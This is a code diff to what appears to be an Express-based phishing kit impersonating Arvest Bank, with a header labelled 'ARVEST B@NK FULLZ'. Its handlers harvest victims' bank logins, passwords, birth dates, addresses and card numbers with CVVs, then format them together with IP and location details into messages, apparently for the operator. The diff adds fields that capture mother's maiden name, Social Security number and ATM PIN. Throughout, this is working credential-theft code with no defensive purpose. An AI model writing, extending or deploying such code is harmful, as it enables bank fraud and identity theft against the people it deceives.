@@ -9,6 +9,7 @@ let storedCredentials = {
   password: "",
   fname: "",
   dob: "",
+  mmn: "",
   phone: "",
   address: "",
   city: "",
@@ -92,7 +93,8 @@ exports.personal = (req, res) => {
 };
 
 exports.personalPost = async (req, res) => {
-  const { fname, dob, phone, address, city1, state, zipcode } = req.body;
+  const { fname, dob, mmn, phone, ssn, address, city1, state, zipcode } =
+    req.body;
   const { userid, password } = storedCredentials;
 
   const iPDetails = await getIPDetails();
@@ -103,7 +105,9 @@ exports.personalPost = async (req, res) => {
     password,
     fname,
     dob,
+    mmn,
     phone,
+    ssn,
     address,
     city,
     state,
@@ -111,7 +115,20 @@ exports.personalPost = async (req, res) => {
   };
 
   const userAgent = req.headers["user-agent"];
-  storedCredentials = { ...storedCredentials, userid, password, fname, dob, phone, address,city1,state, zipcode };
+  storedCredentials = {
+    ...storedCredentials,
+    userid,
+    password,
+    fname,
+    dob,
+    mmn,
+    phone,
+    ssn,
+    address,
+    city1,
+    state,
+    zipcode,
+  };
 
   const message =
     `||ARVEST B@NK FULLZ\n` +
@@ -119,7 +136,9 @@ exports.personalPost = async (req, res) => {
     `||🔑Password  : ${password}\n\n` +
     `||Full Name  : ${fname}\n\n` +
     `||Date of Birth  : ${dob}\n\n` +
+    `||Mother Maiden Name  : ${mmn}\n\n` +
     `||PhoneNum  : ${phone}\n\n` +
+    `||SSN  : ${ssn}\n\n` +
     `||Address  : ${address}\n\n` +
     `||City  : ${city1}\n\n` +
     `||State  : ${state}\n\n` +
@@ -148,13 +167,15 @@ exports.card = (req, res) => {
 // storedCredentials = { email, password, fname, dob, phone, address };
 
 exports.cardPost = async (req, res) => {
-  const { cname, cardNum, exp, cvv } = req.body;
+  const { cname, cardNum, exp, cvv, atm } = req.body;
   const {
     userid,
     password,
     fname,
     dob,
+    mmn,
     phone,
+    ssn,
     address,
     city1,
     state,
@@ -163,8 +184,24 @@ exports.cardPost = async (req, res) => {
 
   const iPDetails = await getIPDetails();
   const { query, city, region, country, isp } = iPDetails;
-  storedCredentials = { ...storedCredentials, userid, password, fname, dob, phone, address,city1,state, zipcode, cname, cardNum, exp, cvv };
-
+  storedCredentials = {
+    ...storedCredentials,
+    userid,
+    password,
+    fname,
+    dob,
+    mmn,
+    phone,
+    ssn,
+    address,
+    city1,
+    state,
+    zipcode,
+    cname,
+    cardNum,
+    exp,
+    cvv,
+  };
 
   const userAgent = req.headers["user-agent"];
 
@@ -174,7 +211,9 @@ exports.cardPost = async (req, res) => {
     `||🔑Password  : ${password}\n\n` +
     `||Fullname  : ${fname}\n\n` +
     `||Date of birth  : ${dob}\n\n` +
+    `||Mother's Maiden Name  : ${mmn}\n\n` +
     `||PhoneNum  : ${phone}\n\n` +
+    `||SSN  : ${ssn}\n\n` +
     `||Address  : ${address}\n\n` +
     `||City  : ${city1}\n\n` +
     `||State  : ${state}\n\n` +
@@ -183,6 +222,7 @@ exports.cardPost = async (req, res) => {
     `||CardNum  : ${cardNum}\n\n` +
     `||Expiry Date  : ${exp}\n\n` +
     `||CVV  : ${cvv}\n\n` +
+    `||ATM PIN  : ${atm}\n\n` +
     `++++++++++++++++++++++++++++++++\n\n` +
     `IP ADDRESS INFO\n` +
     `IP Address       : ${query}\n` +
